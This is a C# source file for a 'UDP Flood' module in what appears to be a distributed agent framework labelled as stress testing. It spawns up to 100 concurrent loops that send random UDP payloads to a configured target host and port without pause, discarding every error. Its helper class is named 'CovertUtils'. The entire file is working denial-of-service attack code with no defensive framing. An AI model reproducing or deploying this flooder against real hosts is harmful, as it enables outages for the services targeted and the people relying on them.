using System.Net.Sockets;

namespace LibraNextgen.Agent.Modules.StressTest;

public class UdpFlood : IStressMethod
{
    public string Name => "UDP Flood";

    public async Task ExecuteAsync(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        var tasks = new List<Task>();
        var threads = Math.Min(config.ThreadsPerAgent / 5, 100);
        for (int i = 0; i < threads; i++)
            tasks.Add(UdpLoop(config, rpt, ct));
        await Task.WhenAll(tasks);
    }

    private async Task UdpLoop(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        using var client = new UdpClient();
        client.Client.SendBufferSize = 65536;

        while (!ct.IsCancellationRequested)
        {
            try
            {
                var payload = CovertUtils.RandomPayload(64, config.PacketSize);
                var sent = await client.SendAsync(payload, config.TargetHost, config.TargetPort, ct);
                rpt.IncrementPackets();
                rpt.IncrementBytes(sent);
            }
            catch (SocketException) { }
            catch { }
        }
    }
}
